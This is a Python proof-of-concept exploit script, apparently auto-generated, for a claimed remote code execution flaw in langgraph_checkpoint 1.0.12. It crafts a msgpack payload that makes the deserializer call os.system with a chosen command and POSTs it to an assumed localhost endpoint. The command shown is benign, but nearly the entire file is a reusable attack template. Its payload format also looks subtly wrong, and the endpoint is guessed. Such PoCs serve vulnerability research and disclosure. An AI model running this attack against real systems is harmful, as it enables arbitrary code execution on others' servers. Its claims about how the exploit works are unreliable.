#!/usr/bin/env python3
# PoC for langgraph_checkpoint-1.0.12 (/tmp/langgraph_checkpoint_old/langgraph_checkpoint-1.0.12)
# Path: suspicious-003
# Sink: _msgpack_ext_hook
# Auto-generated — run with: python3 rce__msgpack_ext_hook.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-1.0.12
Vulnerability: Remote Code Execution via msgpack deserialization in _msgpack_ext_hook

The function _msgpack_ext_hook deserializes attacker-controlled msgpack data and
dynamically imports modules and calls arbitrary functions/constructors without
any validation. This allows an attacker to execute arbitrary code.

The exploit sends a crafted msgpack payload that triggers the EXT_CONSTRUCTOR_SINGLE_ARG
code path, which calls importlib.import_module(module) and then getattr(module, func)(arg).
We use this to execute a benign command (touch /tmp/poc_success.txt) via os.system.
"""

import msgpack
import struct
import sys
import os

# Configuration - change these as needed
TARGET_URL = "http://localhost:8000/api/v1/trigger"
# Benign payload - creates a file to prove code execution
COMMAND = "touch /tmp/poc_success.txt"

def create_malicious_payload(command):
    """
    Create a msgpack payload that exploits the EXT_CONSTRUCTOR_SINGLE_ARG code path.
    
    The payload structure expected by _msgpack_ext_hook:
    - code: EXT_CONSTRUCTOR_SINGLE_ARG (0x01)
    - data: msgpack-encoded tuple of (module_name, function_name, argument)
    
    We use:
    - module: "os"
    - function: "system"
    - argument: the command to execute
    """
    # The ext type code for EXT_CONSTRUCTOR_SINGLE_ARG
    EXT_CONSTRUCTOR_SINGLE_ARG = 0x01
    
    # Create the tuple that will be unpacked by _msgpack_ext_hook
    # tup[0] = module name (e.g., "os")
    # tup[1] = function name (e.g., "system")  
    # tup[2] = argument (e.g., the command)
    payload_tuple = ("os", "system", command)
    
    # Encode the tuple as msgpack
    encoded_tuple = msgpack.packb(payload_tuple)
    
    # Create the ext type payload
    # Format: ext type code (1 byte) + encoded data
    ext_payload = struct.pack("B", EXT_CONSTRUCTOR_SINGLE_ARG) + encoded_tuple
    
    return ext_payload

def send_exploit(url, payload):
    """
    Send the malicious payload to the target endpoint.
    Uses urllib.request since it's in stdlib.
    """
    import urllib.request
    import urllib.error
    
    # Wrap the payload in a request body (assuming the endpoint expects raw data)
    # The exact format depends on how the application passes data to the vulnerable function
    # Common patterns: JSON with base64-encoded msgpack, raw binary, etc.
    # For this PoC, we'll try sending raw binary data
    
    req = urllib.request.Request(
        url,
        data=payload,
        headers={
            'Content-Type': 'application/octet-stream',
            'User-Agent': 'Mozilla/5.0 (PoC)'
        },
        method='POST'
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[+] Response status: {response.status}")
            print(f"[+] Response body: {response.read().decode('utf-8', errors='replace')}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} - {e.reason}")
        print(f"[!] Response body: {e.read().decode('utf-8', errors='replace')}")
        return False
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e.reason}")
        return False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False

def main():
    print("[*] langgraph_checkpoint-1.0.12 RCE PoC")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Command: {COMMAND}")
    print()
    
    # Create the malicious payload
    print("[*] Creating malicious msgpack payload...")
    payload = create_malicious_payload(COMMAND)
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Payload (hex): {payload.hex()}")
    print()
    
    # Send the exploit
    print("[*] Sending exploit...")
    success = send_exploit(TARGET_URL, payload)
    
    if success:
        print("\n[+] Exploit sent successfully!")
        print(f"[+] If the target is vulnerable, check for file: /tmp/poc_success.txt")
        print(f"[+] You can verify by running: ls -la /tmp/poc_success.txt")
    else:
        print("\n[!] Exploit may have failed. Check the error messages above.")
        print("[!] Possible reasons:")
        print("  - Target URL is incorrect or not reachable")
        print("  - The endpoint expects a different request format")
        print("  - The vulnerable function is not exposed through this endpoint")
        print("  - The target is patched or not vulnerable")
    
    # Also provide a local test option
    print("\n[*] To test locally, you can run:")
    print("    python -c \"import msgpack; import struct; import os;")
    print("    payload = struct.pack('B', 0x01) + msgpack.packb(('os', 'system', 'touch /tmp/poc_success.txt'));")
    print("    print('Payload ready:', payload.hex())\"")
    print()
    print("[*] Then send this payload to the vulnerable endpoint.")

if __name__ == "__main__":
    main()
